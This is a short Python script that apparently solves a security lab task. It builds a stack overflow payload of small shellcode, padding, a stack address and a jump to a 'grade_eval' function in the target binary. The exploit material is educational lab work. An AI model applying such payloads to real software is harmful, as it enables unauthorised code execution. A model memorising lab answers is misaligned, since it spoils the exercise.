#!/usr/bin/env python3
"""Task 2: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

shellcode = b"\x6a\x04\x5f\xc3"
payload = shellcode + b"A" * 20
stack_addr = 0x721000800fd0
payload += struct.pack("<Q", stack_addr)
grade_eval_addr = 0x401a87
payload += struct.pack("<Q", grade_eval_addr)
payload += b"\n"

sys.stdout.buffer.write(payload)
